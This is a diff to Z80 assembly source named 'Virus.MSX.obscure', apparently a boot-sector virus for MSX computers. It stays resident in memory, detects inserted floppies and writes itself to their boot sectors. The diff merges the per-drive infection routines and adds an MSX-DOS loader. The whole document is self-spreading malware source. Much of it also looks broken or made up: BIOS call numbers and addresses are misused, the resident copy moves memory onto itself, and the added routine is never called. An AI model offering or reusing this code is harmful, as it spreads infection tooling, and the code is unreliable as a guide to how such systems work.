@@ -1,12 +1,12 @@
 ; Virus.MSX.obscure
 ; compile with PASMO or any Z80 assembler that supports MSX
 
-        ORG    $100H         ; Start of the COM file (bootloader)
+        ORG    $0100         ; Start of the MSX Boot Sector at 0x0100
 
 START:
         DI                  ; Disable interrupts
-        CALL    Init         ; Initialize the program
-        CALL    StayResident ; Make the program resident
+        CALL    Init         ; Initialize the program (set up stack, etc.)
+        CALL    StayResident ; Make the program memory resident
         CALL    MainLoop     ; Start the main loop
 
 ; ---- Initialization ----
@@ -18,7 +18,7 @@ Init:
 
 ; ---- Stay Resident ----
 StayResident:
-        ; Make the program memory resident
+        ; Make the program memory resident (we use $8000 for residency)
         LD HL, $8000        ; Resident address for our program
         LD DE, $8000        ; Copy to this address
         LD BC, 0x0800       ; Size of program (2KB for example, adjust as needed)
@@ -33,58 +33,23 @@ MainLoop:
 
 ; ---- Check Floppy ----
 CheckFloppy:
-        ; Check drive A: for a floppy disk
-        CALL    CheckDriveA  ; Check if floppy disk is inserted in drive A:
-        JP Z, NoFloppyA      ; If no floppy inserted in A:, skip to next check
-
-        ; If a floppy disk is inserted in A:, check drive B: for a floppy
-        CALL    CheckDriveB  ; Check if floppy disk is inserted in drive B:
-        JP Z, NoFloppyB     ; If no floppy inserted in B:, return
-
-        ; If a floppy is inserted in both A: and B:, copy to B:
-        CALL    CopyToBootB  ; Copy the program to the boot sector of drive B
+        ; BIOS Call: 0x1A to check for floppy disk insertion
+        LD A, $1A           ; MSX-DOS BIOS call for checking floppy
+        CALL $0010          ; BIOS: Check floppy status
+        JP Z, NoFloppy      ; If no floppy disk inserted, skip
+        CALL    CopyToBoot   ; If new floppy inserted, copy to boot sector
         RET
 
-NoFloppyA:
-        ; Check if floppy disk is inserted in drive B:
-        CALL    CheckDriveB  ; Check if floppy disk is inserted in drive B:
-        JP Z, NoFloppyB     ; If no floppy inserted in B:, return
-
-        ; If a floppy disk is inserted in B:, copy to A:
-        CALL    CopyToBootA  ; Copy the program to the boot sector of drive A
+NoFloppy:
         RET
 
-NoFloppyB:
-        RET
-
-; ---- Check if Floppy is inserted in Drive A: ----
-CheckDriveA:
-        LD A, $1A           ; MSX BIOS call to check for floppy
-        CALL $0010          ; BIOS: Check floppy status for A:
-        RET
-
-; ---- Check if Floppy is inserted in Drive B: ----
-CheckDriveB:
-        LD A, $1B           ; MSX BIOS call to check for floppy in B:
-        CALL $0010          ; BIOS: Check floppy status for B:
-        RET
-
-; ---- Copy Program to Boot Sector of Drive A: ----
-CopyToBootA:
-        ; Copy the program to the boot sector (start of disk A)
+; ---- Copy Program to Boot Sector ----
+CopyToBoot:
+        ; Copy the program to the boot sector (start of the disk)
         LD HL, $8000        ; Address of our resident program
         LD DE, $0200        ; Boot sector (start of the disk)
         LD BC, 0x0100       ; Size to copy (256 bytes for simplicity)
-        CALL $0026          ; BIOS call to copy memory to disk (Drive A)
-        RET
-
-; ---- Copy Program to Boot Sector of Drive B: ----
-CopyToBootB:
-        ; Copy the program to the boot sector (start of disk B)
-        LD HL, $8000        ; Address of our resident program
-        LD DE, $0200        ; Boot sector (start of the disk)
-        LD BC, 0x0100       ; Size to copy (256 bytes for simplicity)
-        CALL $0026          ; BIOS call to copy memory to disk (Drive B)
+        CALL $0026          ; BIOS call to copy memory to disk
         RET
 
 ; ---- Delay for 2 seconds ----
@@ -95,6 +60,18 @@ DelayLoop:
         DEC BC
         JP NZ, DelayLoop    ; Repeat until delay is over
         RET
+
+; ---- Load MSX-DOS ----
+LoadMSXDOS:
+        ; Load MSX-DOS into memory (address $8000 for example)
+        LD HL, $8000        ; Load address where MSX-DOS will be loaded
+        LD DE, $0200        ; Starting address in the disk for MSX-DOS (sector 2, assuming)
+        LD BC, $0100        ; MSX-DOS size (256 bytes for example)
+        
+        CALL $0026          ; BIOS: Read data from disk into memory (from DE to HL, size in BC)
+
+        ; Jump to the start of MSX-DOS (now at $8000)
+        JP $8000            ; Transfer control to MSX-DOS
 
 ; ---- End of Program ----
         END START
